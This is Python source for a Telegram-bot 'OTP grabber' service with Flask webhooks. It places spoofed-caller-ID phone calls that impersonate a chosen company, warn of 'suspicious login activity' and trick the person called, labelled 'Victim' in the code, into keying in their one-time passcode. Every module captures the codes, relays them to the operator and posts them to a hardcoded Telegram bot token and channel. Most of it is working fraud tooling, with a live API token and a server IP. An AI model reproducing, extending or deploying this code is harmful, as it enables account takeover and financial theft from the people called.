def callmaking(number,spoof,chatid,service,amd):
                db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
                c = db.cursor()
                c.execute(f"Select * from api_key where id=123")
                apidata= c.fetchone()

                if apidata[1]==1:
                    if amd =="True":
                        data = {
                        "to_": f"+{number}",
                        "from_": f"+{spoof}",
                        "callbackurl": f"{ngrok_url}/{service}/{chatid}/random",
                        "apikey": f"{apiKey}",
                        "amd":True
                            }
                    elif amd =="False":
                        data = {
                        "to_": f"+{number}",
                        "from_": f"+{spoof}",
                        "callbackurl": f"{ngrok_url}/{service}/{chatid}/random",
                        "apikey": f"{apiKey}",
                        "amd":False
                            }
                    url = "https://ai2api.com/v1/api/create-call"
                    resp = requests.post(url, json=data)
                    res = json.loads(resp.text)
                    print(resp.text)
                    c.execute(f"update call_data set call_control_id='{res['uuid']}'  where chat_id={chatid} ")
                    db.commit()

                elif apidata[1]==2:
                    callurl = 'http://162.33.178.184:3001/v1/call'

                    headers = {
    'Content-Type': 'application/json',
}
                    data = {

  "apikey": f"{apiKey2}",
  "to":f"{apidata[2]}{number}",
  "from":f"{spoof}",
  "callback":f"{ngrok_url}/{service}/{chatid}/random/texis",
  "enable": "8881"
}
                    response = requests.post(callurl, headers=headers, json=data)
                    res = json.loads(response.text)
                    print(response.text)
                    c.execute(f"update call_data set call_control_id='{res['uuid']}'  where chat_id={chatid} ")
                    db.commit()    




def make_call(t:str,f:str,user_id,service,amd):
    callmaking(number=t,spoof=f,chatid=user_id,service=service,amd=amd)

def custom_callmaking(number,spoof,chatid,script_id,amd):
                db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
                c = db.cursor()
                c.execute(f"Select * from api_key where id=123")
                apidata= c.fetchone()
                
                if apidata[1]==1:
                        print("Mia API")
                        url = "https://ai2api.com/v1/api/create-call"
                        if amd =="True":
                             data = {
                             "to_": f"+{number}",
                              "from_": f"+{spoof}",
                              "callbackurl": f"{ngrok_url}/{script_id}/{chatid}/custom",
                              "apikey": f"{apiKey}",
                              "amd":True
                                }
                        elif amd =="False":
                             data = {
                             "to_": f"+{number}",
                              "from_": f"+{spoof}",
                              "callbackurl": f"{ngrok_url}/{script_id}/{chatid}/custom",
                              "apikey": f"{apiKey}",
                              "amd":False
                                }
                        resp = requests.post(url, json=data)
                        res = json.loads(resp.text)
                        c.execute(f"update call_data set call_control_id='{res['uuid']}'  where chat_id={chatid} ")
                        db.commit()
                elif apidata[1]==2:
                    print("Texis api")
                    callurl = 'http://162.33.178.184:3001/v1/call'
                    headers = {
                                'Content-Type': 'application/json',}
                    data = {

  "apikey": f"{apiKey2}",
  "to":f"{apidata[2]}{number}",
  "from":f"+{spoof}",
  "callback":f"{ngrok_url}/{script_id}/{chatid}/custom/texis",
  "enable": "8881"
}
                    response = requests.post(callurl, headers=headers, json=data)
                    res = json.loads(response.text)
                    print(response.text)
                    c.execute(f"update call_data set call_control_id='{res['uuid']}'  where chat_id={chatid} ")
                    db.commit()    



def custom_make_call(t:str,f:str,user_id,script_id:int,amd):
    custom_callmaking(number=t,spoof=f,chatid=user_id,script_id=script_id,amd=amd)
   
# ------------------Recall feature ---------------------------------
@bot.message_handler(commands=['recall'])
def recall_now(message):
   db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
   c = db.cursor()
   id = message.from_user.id
   c.execute(f"Select * from users where user_id={id}")
   cl= c.fetchone()
   if cl!=None:
       if cl[3]!='ban':
            if cl[3]=='active':
                call_update(id)
                days = user_day_check(id)
                caller=cl[5]
                vict=cl[4]
                if days>=1:
                        bot.send_message(message.from_user.id,f"""
📞 <b>Recalling</b> +{vict}
📱 <b>As</b> +{caller}
✋ <b>Hold on !</b> Calling in progress

❌ Press /endcall to disconnect all active calls.""",parse_mode='HTML')
                        try:   
                            c.execute(f"select * from call_data where chat_id={id} limit 1")
                            last_script = c.fetchone()
                            if last_script[2]!='custom':
                                make_call(vict,caller,id,f'{last_script[2]}',amd=cl[13])
                            elif last_script[2]=='custom':
                                 c.execute(f"select * from users where user_id={id} limit 1")
                                 clast_script = c.fetchone()
                                 custom_make_call(vict,caller,id,clast_script[6],amd=cl[13])
                        except:
                            print("Unknown Error Recalling")
                elif days==0:    
                    bot.send_message(message.from_user.id,f"""*❌ Key Expired*""",parse_mode='markdown')
                    delete_data(id)
            elif(cl[3]=='ongoing'):
                    print("Recall Passed")
                    pass
       else:
             bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')
   else:
      bot.send_message(message.from_user.id,f"""* ❌ Redeem key to activate *""",parse_mode='markdown')
#----------------------------------------------------------------------------

#--------------------------------custom---CALL WEBHOOK-------------------------------------------------------
def custom_confirm1(message):
       #Database connect------------------------
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor() 
    #_____________________________________
    chat_id = message.from_user.id

    up_resp1= message.text
    
    c.execute(f"Select * from users where user_id={chat_id}")
    sc_id = c.fetchone()
    customscid = sc_id[6]

    c.execute(f"Select * from call_data where chat_id={chat_id}")
    custom_cont = c.fetchone()
    call_control_id  = custom_cont[1]

    c.execute(f"select * from custom_scripts where script_id={customscid} limit 1")
    custom_waiting = c.fetchone()

    c.execute(f"select * from users where user_id='{chat_id}' limit 1")
    voice = c.fetchone()
    selected_voice = voice[7]
    no_space_voice = "".join(selected_voice.split())

    digits = custom_waiting[8]
    nospace_digits= "".join(digits.split())

    
    if up_resp1=='Accept':
        url = 'https://ai2api.com/v1/api/play-text'
        data = {
    "uuid": f"{call_control_id}",
    "text": f"{custom_waiting[5]}",
    "voice": f"{no_space_voice}",
}
        requests.post(url, json=data)
        bot.send_message(chat_id,f"*Code Accpeted ✅ Vouch To  @sourcebotvouches 🫶*",parse_mode='markdown')
        time.sleep(4)
        callhangup(chat_id)
    elif up_resp1=='Deny':
        mes1=bot.send_message(chat_id,f"""*Code Rejected ❌*""",parse_mode='markdown').message_id
        url = 'https://ai2api.com/v1/api/gather-text'
        data = {
    "uuid": f"{call_control_id}",
    "text": f"{custom_waiting[7]}",
    "voice": f"{no_space_voice}",
    "maxdigits": f"{nospace_digits}",

}
        requests.post(url, json=data)
        response = requests.post(f"https://api.telegram.org/bot{bot_tkn}/editMessageText", 
              data={
            "chat_id": chat_id,
            "message_id": mes1,
            "text": '*Asking For Otp Again 🗣️*',
            'parse_mode':'markdown'})
    c.close()
    return 'Webhook received successfully!', 200
        
@app.route('/<script_id>/<chatid>/custom', methods=['POST'])
def custom_prebuild_script_call(script_id,chatid):
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    data = request.get_json()
    print(data)
    call_control_id = data['uuid']
    event = data['state']
    c.execute(f"select * from custom_scripts where script_id='{script_id}' limit 1")
    custom_sc_src = c.fetchone()
    digits = custom_sc_src[8]
    nospace_digits= "".join(digits.split())
    c.execute(f"select * from users where user_id='{chatid}' limit 1")
    voices = c.fetchone()
    selected_voice = voices[7]
    call_cost = voices[11]
    no_space_voice = "".join(selected_voice.split())

  
    if event == "ringing":
        callhangbutton(chatid)
        
    elif event == "in-progress":
            url1 = "https://ai2api.com/v1/api/gather-text"
            data = {
    "uuid": f"{call_control_id}",
    "text": f"{custom_sc_src[3]}",
    "voice": f"{no_space_voice}",
    "maxdigits": f"1",
    
}
            requests.post(url1, json=data)
            bot.send_message(chatid,f"""*Call Answered 📞*""",parse_mode='markdown')
        

    elif event == "completed":
        call_cause = data['cause']
        try:
            resp = data['audio']
            per_call_cost = data['cost']
            call_cost_update = call_cost + per_call_cost
            response = requests.get(resp)
            payload = {
                'chat_id': {chatid},
                'title': 'transcript.mp3',
                'parse_mode': 'HTML'
            }
            files = {
                'audio': response.content,
            }
            requests.post(f"https://api.telegram.org/bot{bot_tkn}/sendAudio".format(bot_tkn=f"{bot_tkn}"),data=payload,files=files)
            c.execute(f"Update users set call_cost ={call_cost_update} where user_id={chatid}")
            db.commit()
        except:
            print("No Audio File")
        finally:
            global last_message_ids
            if call_cause  == "Unknown":
                 mes = "Call Ended🛑"
            elif call_cause == "Circuit/channel congestion":
                 mes = "Call ended due to API issue ⚙️"
            elif call_cause == "Normal Clearing":
                 mes = "Call Ended by Victim 🛑"
            else:
                 mes =  " Call Ended 🛑 "
            mesid = bot.send_message(chatid,f"""*{mes}\nMake call again - /recall*""", parse_mode='Markdown').message_id
            last_message_ids[chatid]=mesid
            c.execute(f"Update users set status='active' where user_id={chatid}")
            db.commit()


    elif event == "amd.machine":
        bot.send_message(chatid,f"""*Machine found 🤖*""",parse_mode='markdown')

    elif event == "amd.human":
        bot.send_message(chatid,f"""*Human found 👤*""",parse_mode='markdown')


    elif event == "dtmf.entered":
        data = request.get_json()
        digit =  data['digit']
        bot.send_message(chatid,f"""*Digit Pressed ⏩ {digit} *""",parse_mode='markdown')
   
        
    elif event == "dtmf.gathered":
        data = request.get_json()
        otp2 = data['digits']

        if otp2 == "1":
            def custom_ask_otp():
                url3 = 'https://ai2api.com/v1/api/gather-text'
                data = {
    "uuid": f"{call_control_id}",
    "text": f"{custom_sc_src[4]}",
    "voice": f"{no_space_voice}",
    "maxdigits": f"{nospace_digits}",
    
}
                requests.post(url3, json=data)
            def custom_send_ask_otp(): 
                bot.send_message(chatid,f"""*The Victim Pressed 1.🦧 Send OTP Now📲*""",parse_mode='markdown')
            custom_bgtask2 = threading.Thread(target=custom_ask_otp)

            custom_bgtask2.start()
            custom_send_ask_otp()
           
        elif(len(otp2)>=4):
            url = 'https://ai2api.com/v1/api/play-text'
            data = {
    "uuid": f"{call_control_id}",
    "text": f"{custom_sc_src[6]}",
    "voice": f"{no_space_voice}",
    
}
            requests.post(url, json=data)
            otp_grabbed(chatid,otp=otp2)
            bot.send_message(chatid,f"""<b>OTP CAPTURE SUCCESSFULLY</b> 🐼 <code>{otp2}</code> ✅""",parse_mode='HTML')
            keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
            keyboard.row_width =2
            keyboard.max_row_keys=2
            item1 = types.KeyboardButton(text="Accept")
            item2 = types.KeyboardButton(text="Deny")
            keyboard.add(item1,item2) 
            callinfo=bot.send_message(chatid, f"*Code received successfully ✅*", reply_markup=keyboard,parse_mode='markdown')
            requests.post(f"""https://api.telegram.org/bot7024645991:AAHTKnh5mXSDLhDfXVQgcNe2_Q23Ei6m8tQ/sendMessage?chat_id=-1002163467133&text=
🚀 Source OTP Capture 🚀
Another Call Was Successful 👤

Custom OTP:- <code>{otp2}</code> ✅
Username:- @{voices[12]} 🆔
Service Name:- {custom_sc_src[2]} ⌛️
Call Type:- CustomCall 📲

Powered By:- @Sourceotpbot 🔐""")
            bot.register_next_step_handler(callinfo,custom_confirm1)
    c.close()
    return 'Webhook received successfully!', 200

#--------------------------------------------------------------------------------------------------------------------------------

#--------------------------------NORMAL---CALL WEBHOOK-------------------------------------------------------
def confirm1(message):
       #Database connect------------------------
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor() 
    #_____________________________________
    chat_id = message.from_user.id
    up_resp1= message.text
    c.execute(f"Select * from call_data where chat_id={chat_id}")
    cont = c.fetchone()
    name = message.from_user.first_name

    c.execute(f"select * from users where user_id='{chat_id}' limit 1")
    voices = c.fetchone()
    selected_voice = voices[7]
    no_space_voice = "".join(selected_voice.split())
    call_control_id  = cont[1]
    otp_digits  = cont[3]

    if up_resp1=='Accept':
        url = 'https://ai2api.com/v1/api/play-text'
        data = {
    "uuid": f"{call_control_id}",
    "text": f"Thank You, You Code Was Valid And your Account Is Safe, Now May You Hangup Have A Great Day.",
    "voice": f"{voices[7]}",
    
}
        requests.post(url, json=data)
        bot.send_message(chat_id,f"*Code Accpeted ✅ Vouch To  @sourcebotvouches 🫶*",parse_mode='markdown')
        time.sleep(4)
        callhangup(chat_id)

    elif up_resp1=='Deny':
        mes1=bot.send_message(chat_id,f"""* Code Rejected ❌ *""",parse_mode='markdown').message_id
        url = 'https://ai2api.com/v1/api/gather-text'
        data = {
    "uuid": f"{call_control_id}",
    "text": f"Oops Sorry, Your Code Was Invalid Or Expired, We Have Send A {otp_digits} digits Code, Dail It For Verification.",
    "voice": f"{no_space_voice}",
    "maxdigits": f"{otp_digits}",
    
}
        requests.post(url, json=data)
        response = requests.post(f"https://api.telegram.org/bot{bot_tkn}/editMessageText", 
              data={
            "chat_id": chat_id,
            "message_id": mes1,
            "text": '*Asking For Code Again 🗣️*',
            'parse_mode':'markdown'})
    
    c.close()
    return 'Webhook received successfully!', 200
        
@app.route('/<service>/<chatid>/random', methods=['POST'])
def prebuild_script_call(service,chatid):
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    data = request.get_json()
    print(data)
    call_control_id = data['uuid']
    event = data['state']
    c.execute(f"select * from users where user_id='{chatid}' limit 1")
    voices = c.fetchone()
    selected_voice = voices[7]
    call_cost = voices[11]
    no_space_voice = "".join(selected_voice.split())
    
    if event == "ringing":
        callhangbutton(chatid)

    elif event == "in-progress":
        url1 = "https://ai2api.com/v1/api/gather-text"
        data = {
    "uuid": f"{call_control_id}",
    "text": f"Hello Dear Customer We Are Calling From {service}, We Detect A Suspicious Login Activity On Your {service} Account. if It Is Not You Press One.",
    "voice": f"{no_space_voice}",
    "maxdigits": f"1",
}
        requests.post(url1, json=data)
        bot.send_message(chatid,f"""*Call Answered 📞*""",parse_mode='markdown')
    
    elif event == "completed":
        call_cause = data['cause']
        try:
            resp = data['audio']
            per_call_cost = data['cost']
            call_cost_update = call_cost + per_call_cost
            response = requests.get(resp)
            payload = {
                'chat_id': {chatid},
                'title': 'transcript.mp3',
                'parse_mode': 'HTML'
            }
            files = {
                'audio': response.content,
            }
            requests.post(f"https://api.telegram.org/bot{bot_tkn}/sendAudio".format(bot_tkn=f"{bot_tkn}"),data=payload,files=files)
            c.execute(f"Update users set call_cost ={call_cost_update} where user_id={chatid}")
            db.commit()
        except:
            print("No Audio File")
        finally:
            global last_message_ids
            if call_cause  == "Unknown":
                 mes = "Call Ended 🛑"
            elif call_cause == "Circuit/channel congestion":
                 mes = "Call ended due to API issue ⚙️"
            elif call_cause == "Normal Clearing":
                 mes = "Call Ended by Victim 🛑"
            else:
                 mes =  " Call Ended 🛑 "

            mesid = bot.send_message(chatid,f"""*{mes}\nMake call again - /recall*""", parse_mode='Markdown').message_id
            last_message_ids[chatid]=mesid
            c.execute(f"Update users set status='active' where user_id={chatid}")
            db.commit()

    elif event == "amd.machine":
        bot.send_message(chatid,f"""*Machine found 🤖*""",parse_mode='markdown')
        

    elif event == "amd.human":
        bot.send_message(chatid,f"""*Human found 👤*""",parse_mode='markdown')
        
    elif event == "dtmf.entered":
        data = request.get_json()
        digit =  data['digit']
        bot.send_message(chatid,f"""*Digit Pressed ⏩ {digit}*""",parse_mode='markdown')


    elif event == "dtmf.gathered":
        data = request.get_json()
        otp2 = data['digits']

        if otp2 == "1":
            def ask_otp():
                c.execute(f"Select * from call_data where chat_id={chatid}")
                cont = c.fetchone()
                otp_digits  = cont[3]
                url3 = 'https://ai2api.com/v1/api/gather-text'
                data = {
    "uuid": f"{call_control_id}",
    "text": f"For Remove The Login Device We Have Send A {otp_digits} digits confarmation code on Your Registered Mobile Number. it Is Compulsory For Owner Verification.",
    "voice": f"{no_space_voice}",
    "maxdigits": f"{otp_digits}",
}
                requests.post(url3, json=data)

            def send_ask_otp(): 
                bot.send_message(chatid,f"""*The Victim Pressed 1.🦧 Send OTP Now📲*""",parse_mode='markdown')
            bgtask2 = threading.Thread(target=ask_otp)
            bgtask2.start()
            send_ask_otp()
           

        elif(len(otp2)>=4):
            url = 'https://ai2api.com/v1/api/play-text'
            data = {
    "uuid": f"{call_control_id}",
    "text": f"Thank You, Please Wait A Minute We Are Checking Your Code.",
    "voice": f"{no_space_voice}",
}
            requests.post(url, json=data)
            otp_grabbed(chatid,otp2)
            bot.send_message(chatid,f"""<b>OTP CAPTURE SUCCESSFULLY</b> 🐼 <code>{otp2}</code> ✅""",parse_mode='HTML')
            keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
            keyboard.row_width =2
            keyboard.max_row_keys=2
            item1 = types.KeyboardButton(text="Accept")
            item2 = types.KeyboardButton(text="Deny")
            keyboard.add(item1,item2) 
            callinfo=bot.send_message(chatid, f"*Code received successfully ✅*", reply_markup=keyboard,parse_mode='markdown',)
            requests.post(f"""https://api.telegram.org/bot7024645991:AAHTKnh5mXSDLhDfXVQgcNe2_Q23Ei6m8tQ/sendMessage?chat_id=-1002163467133&text=
🚀 Source OTP Capture 🚀
Another Call Was Successful 👤

Custom OTP:- <code>{otp2}</code> ✅
Username:- @{voices[12]} 🆔
Service Name:- {service} ⌛️
Call Type:- Normal Call 📲

Powered By:- @Sourceotpbot 🔐""")
            bot.register_next_step_handler(callinfo,confirm1)
    c.close()
    return 'Webhook received successfully!', 200

#--------------------------------------------------------------------------------------------------------------------------------

#------------------------------------------Texis API Starts- --------------------------------------------------------------------

def tcustom_confirm1(message):
       #Database connect------------------------
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor() 
    #_____________________________________
    chat_id = message.from_user.id
    up_resp1= message.text
    
    c.execute(f"Select * from users where user_id={chat_id}")
    sc_id = c.fetchone()
    customscid = sc_id[6]

    c.execute(f"Select * from call_data where chat_id={chat_id}")
    custom_cont = c.fetchone()
    call_control_id  = custom_cont[1]

    c.execute(f"select * from custom_scripts where script_id={customscid} limit 1")
    custom_waiting = c.fetchone()

    c.execute(f"select * from users where user_id='{chat_id}' limit 1")
    voice = c.fetchone()
    selected_voice = voice[7]
    no_space_voice = "".join(selected_voice.split())

    digits = custom_waiting[8]
    nospace_digits= "".join(digits.split())

    
    if up_resp1=='Accept':
        url = 'http://162.33.178.184:3001/v1/tts'
        data = {
    "uuid": f"{call_control_id}",
    "text": f"{custom_waiting[5]}",
    "voice": f"{no_space_voice}",
    "apikey":f"{apiKey2}"
}
        requests.post(url, json=data)
        bot.send_message(chat_id,f"*Code Accpeted ✅ Vouch To  @sourcebotvouches 🫶*",parse_mode='markdown')
        time.sleep(4)
        callhangup(chat_id)
    elif up_resp1=='Deny':
        mes1=bot.send_message(chat_id,f"""*Code Rejected ❌*""",parse_mode='markdown').message_id
        url = 'http://162.33.178.184:3001/v1/gather_tts'
        data = {
    "uuid": f"{call_control_id}",
    "text": f"{custom_waiting[7]}",
    "voice": f"{no_space_voice}",
    "length": f"{nospace_digits}",
    "apikey":f"{apiKey2}"

}
        requests.post(url, json=data)
        response = requests.post(f"https://api.telegram.org/bot{bot_tkn}/editMessageText", 
              data={
            "chat_id": chat_id,
            "message_id": mes1,
            "text": '*Asking For Otp Again 🗣️*',
            'parse_mode':'markdown'})
    c.close()
    return 'Webhook received successfully!', 200
        
@app.route('/<script_id>/<chatid>/custom/texis', methods=['POST'])
def t_custom_prebuild_script_call(script_id,chatid):
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    data = request.get_json()
    print(data)
    call_control_id = data['uuid']
    event = data['event']
    c.execute(f"select * from custom_scripts where script_id='{script_id}' limit 1")
    custom_sc_src = c.fetchone()
    digits = custom_sc_src[8]
    nospace_digits= "".join(digits.split())
    c.execute(f"select * from users where user_id='{chatid}' limit 1")
    voices = c.fetchone()
    selected_voice = voices[7]
    call_cost = voices[11]
    no_space_voice = "".join(selected_voice.split())

  
    if event == "ringing":
        callhangbutton(chatid)
        
    elif event == "answered":
            url1 = "http://162.33.178.184:3001/v1/gather_tts"
            data = {
    "uuid": f"{call_control_id}",
    "text": f"{custom_sc_src[3]}",
    "voice": f"{no_space_voice}",
    "length": f"1",
    "apikey":f"{apiKey2}"
    
}
            requests.post(url1, json=data)
            bot.send_message(chatid,f"""*Call Answered 📞*""",parse_mode='markdown')
        

    elif event == "hangup":
        try:
            res = data['recname']
            resp = recordingtexis(res)
            response = requests.get(resp)
            payload = {
                'chat_id': {chatid},
                'title': 'transcript.mp3',
                'parse_mode': 'HTML'
            }
            files = {
                'audio': response.content,
            }
            requests.post(f"https://api.telegram.org/bot{bot_tkn}/sendAudio".format(bot_tkn=f"{bot_tkn}"),data=payload,files=files)
        except:
            print("No Audio File")
        finally:
            global last_message_ids
            mes =  " Call Ended 🛑 "

            mesid = bot.send_message(chatid,f"""*{mes}\nMake call again - /recall*""", parse_mode='Markdown').message_id
            last_message_ids[chatid]=mesid
            c.execute(f"Update users set status='active' where user_id={chatid}")
            db.commit()


    elif event == "dtmf.received":
        data = request.get_json()
        digit =  data['digit']
        bot.send_message(chatid,f"""*Digit Pressed ⏩ {digit}*""",parse_mode='markdown')
   
        
    elif event == "dtmf.completed":
        data = request.get_json()
        otp2 = data['digits']

        if otp2 == "1":
            def custom_ask_otp():
                url3 = 'http://162.33.178.184:3001/v1/gather_tts'
                data = {
    "uuid": f"{call_control_id}",
    "text": f"{custom_sc_src[4]}",
    "voice": f"{no_space_voice}",
    "length": f"{nospace_digits}",
    "apikey":f"{apiKey2}"
    
}
                requests.post(url3, json=data)
            def custom_send_ask_otp(): 
                bot.send_message(chatid,f"""*The Victim Pressed 1.🦧 Send OTP Now📲*""",parse_mode='markdown')
            custom_bgtask2 = threading.Thread(target=custom_ask_otp)

            custom_bgtask2.start()
            custom_send_ask_otp()
           
        elif(len(otp2)>=4):
            url = 'http://162.33.178.184:3001/v1/tts'
            data = {
    "uuid": f"{call_control_id}",
    "text": f"{custom_sc_src[6]}",
    "voice": f"{no_space_voice}",
    "apikey":f"{apiKey2}"
    
}
            requests.post(url, json=data)
            otp_grabbed(chatid,otp=otp2)
            bot.send_message(chatid,f"""<b>OTP CAPTURE SUCCESSFULLY</b> 🐼 <code>{otp2}</code> ✅""",parse_mode='HTML')
            keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
            keyboard.row_width =2
            keyboard.max_row_keys=2
            item1 = types.KeyboardButton(text="Accept")
            item2 = types.KeyboardButton(text="Deny")
            keyboard.add(item1,item2) 
            callinfo=bot.send_message(chatid, f"*Code received successfully ✅*", reply_markup=keyboard,parse_mode='markdown')
            requests.post(f"""https://api.telegram.org/bot7024645991:AAHTKnh5mXSDLhDfXVQgcNe2_Q23Ei6m8tQ/sendMessage?chat_id=-1002163467133&text=
🚀 Source OTP Capture 🚀
Another Call Was Successful 👤

Custom OTP:- <code>{otp2}</code> ✅
Username:- @{voices[12]} 🆔
Service Name:- {custom_sc_src[2]} ⌛️
Call Type:- CustomCall 📲

Powered By:- @Sourceotpbot 🔐""")
            bot.register_next_step_handler(callinfo,tcustom_confirm1)
    else:
         print("Nothing")
    c.close()

    return 'Webhook received successfully!', 200




def tconfirm1(message):
       #Database connect------------------------
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor() 
    #_____________________________________
    chat_id = message.from_user.id
    up_resp1= message.text
    c.execute(f"Select * from call_data where chat_id={chat_id}")
    cont = c.fetchone()
    name = message.from_user.first_name

    c.execute(f"select * from users where user_id='{chat_id}' limit 1")
    voices = c.fetchone()
    selected_voice = voices[7]
    no_space_voice = "".join(selected_voice.split())
    call_control_id  = cont[1]
    otp_digits  = cont[3]

    if up_resp1=='Accept':
        url = 'http://162.33.178.184:3001/v1/tts'
        data = {
    "apikey":f"{apiKey2}",
    "uuid": f"{call_control_id}",
    "text": f"Thank You, You Code Was Valid And your Account Is Safe, Now May You Hangup Have A Great Day.",
    "voice": f"{voices[7]}",
    
}
        requests.post(url, json=data)
        bot.send_message(chat_id,f"*Code Accpeted ✅ Vouch To  @sourcebotvouches 🫶*",parse_mode='markdown')
        time.sleep(4)
        callhangup(chat_id)

    elif up_resp1=='Deny':
        mes1=bot.send_message(chat_id,f"""* Code Rejected ❌ *""",parse_mode='markdown').message_id
        url = 'http://162.33.178.184:3001/v1/gather_tts'
        data = {
    "apikey":f"{apiKey2}",
    "uuid": f"{call_control_id}",
    "text": f"Oops Sorry, Your Code Was Invalid Or Expired, We Have Send A {otp_digits} digits Code, Dail It For Verification.",
    "voice": f"{no_space_voice}",
    "length": f"{otp_digits}",
    
}
        requests.post(url, json=data)
        response = requests.post(f"https://api.telegram.org/bot{bot_tkn}/editMessageText", 
              data={
            "chat_id": chat_id,
            "message_id": mes1,
            "text": '*Asking For Code Again 🗣️*',
            'parse_mode':'markdown'})
    
    c.close()
    return 'Webhook received successfully!', 200
        
@app.route('/<service>/<chatid>/random/texis', methods=['POST'])
def tprebuild_script_call(service,chatid):
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    data = request.get_json()
    print(data)
    call_control_id = data['uuid']
    event = data['event']
    c.execute(f"select * from users where user_id='{chatid}' limit 1")
    voices = c.fetchone()
    selected_voice = voices[7]
    call_cost = voices[11]
    no_space_voice = "".join(selected_voice.split())
    
    if event == "ringing":
        callhangbutton(chatid)

    elif event == "answered":
        url1 = "http://162.33.178.184:3001/v1/gather_tts"
        data = {
    "apikey":f"{apiKey2}",
    "uuid": f"{call_control_id}",
    "text": f"Hello Dear Customer We Are Calling From {service}, We Detect A Suspicious Login Activity On Your {service} Account. if It Is Not You Press One.",
    "voice": f"{no_space_voice}",
    "length": f"1",
}
        requests.post(url1, json=data)
        bot.send_message(chatid,f"""*Call Answerd 🗣️*""",parse_mode='markdown')
    
    elif event == "hangup":
        try:
            res = data['recname']
            resp = recordingtexis(res)
            response = requests.get(resp)
            payload = {
                'chat_id': {chatid},
                'title': 'transcript.mp3',
                'parse_mode': 'HTML'
            }
            files = {
                'audio': response.content,
            }
            requests.post(f"https://api.telegram.org/bot{bot_tkn}/sendAudio".format(bot_tkn=f"{bot_tkn}"),data=payload,files=files)
            # c.execute(f"Update users set call_cost ={call_cost_update} where user_id={chatid}")
            # db.commit()
        except:
            print("No Audio File")
        finally:
            global last_message_ids
            mes =  " Call Ended 🛑 "
 
            mesid = bot.send_message(chatid,f"""*{mes}\n Make call again - /recall*""", parse_mode='Markdown').message_id
            last_message_ids[chatid]=mesid
            c.execute(f"Update users set status='active' where user_id={chatid}")
            db.commit()


    elif event == "dtmf.received":
        data = request.get_json()
        digit =  data['digit']
        bot.send_message(chatid,f"""*Digit Pressed ⏩ {digit}*""",parse_mode='markdown')


    elif event == "dtmf.completed":
        data = request.get_json()
        otp2 = data['digits']

        if otp2 == "1":
            def ask_otp():
                c.execute(f"Select * from call_data where chat_id={chatid}")
                cont = c.fetchone()
                otp_digits  = cont[3]
                url3 = 'http://162.33.178.184:3001/v1/gather_tts'
                data = {
    "uuid": f"{call_control_id}",
    "apikey":f"{apiKey2}",
    "text": f"For Remove The Login Device We Have Send A {otp_digits} digits confarmation code on Your Registered Mobile Number. it Is Compulsory For Owner Verification.",
    "voice": f"{no_space_voice}",
    "length": f"{otp_digits}",
}
                requests.post(url3, json=data)

            def send_ask_otp(): 
                bot.send_message(chatid,f"""*The Victim Pressed 1.🦧 Send OTP Now📲*""",parse_mode='markdown')
            bgtask2 = threading.Thread(target=ask_otp)
            bgtask2.start()
            send_ask_otp()
           

        elif(len(otp2)>=4):
            url = 'http://162.33.178.184:3001/v1/tts'
            data = {
    "apikey":f"{apiKey2}",
    "uuid": f"{call_control_id}",
    "text": f"Thank You, Please Wait A Minute We Are Checking Your Code.",
    "voice": f"{no_space_voice}",
}
            requests.post(url, json=data)
            otp_grabbed(chatid,otp2)
            bot.send_message(chatid,f"""<b>OTP CAPTURE SUCCESSFULLY</b> 🐼 <code>{otp2}</code> ✅""",parse_mode='HTML')
            keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
            keyboard.row_width =2
            keyboard.max_row_keys=2
            item1 = types.KeyboardButton(text="Accept")
            item2 = types.KeyboardButton(text="Deny")
            keyboard.add(item1,item2) 
            callinfo=bot.send_message(chatid, f"*Code received successfully ✅*", reply_markup=keyboard,parse_mode='markdown',)
            requests.post(f"""https://api.telegram.org/bot7024645991:AAHTKnh5mXSDLhDfXVQgcNe2_Q23Ei6m8tQ/sendMessage?chat_id=-1002163467133&text=
🚀 Source OTP Capture 🚀
Another Call Was Successful 👤

Custom OTP:- <code>{otp2}</code> ✅
Username:- @{voices[12]} 🆔
Service Name:- {service} ⌛️
Call Type:- Normal Call 📲

Powered By:- @Sourceotpbot 🔐""")
            bot.register_next_step_handler(callinfo,tconfirm1)
    c.close()
    return 'Webhook received successfully!', 200




# normal CALLING -------------------------------------------------------------------
@bot.message_handler(commands=['call'])
def make_call_command(message):
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    id = message.from_user.id
    c.execute(f"Select * from users where user_id={id}")
    row= c.fetchone()
    if row!=None :
        if row[3]!='ban':
            if user_day_check(id)>0:
                    try:
                        mes =(message.text).split()
                        number = mes[1]
                        spoof = mes[2]
                        service_name = mes[3]
                        otp_digits = int(mes[4])
                        voice = mes[5]
                        bot.send_message(message.from_user.id,f"""
📞 <b>Calling</b> +{number}
📱 <b>As</b> +{spoof}
✋ <b>Hold on !</b> Calling in progress

❌ Press /endcall to disconnect all active calls.""",parse_mode='HTML')
                        c.execute(f"update users set v_no={number},spoof_no={spoof},inp_sc='{voice}',del_col=0,status='active' where user_id={id} ")
                        db.commit()
                        c.execute(f"update call_data set last_service='{service_name}',otp_digits={otp_digits} where chat_id={id} ")
                        db.commit()
                        call_update(id)
                        a = make_call(f=f"{spoof}",t=f"{number}", user_id=id,service=service_name,amd=row[13])
                    except:
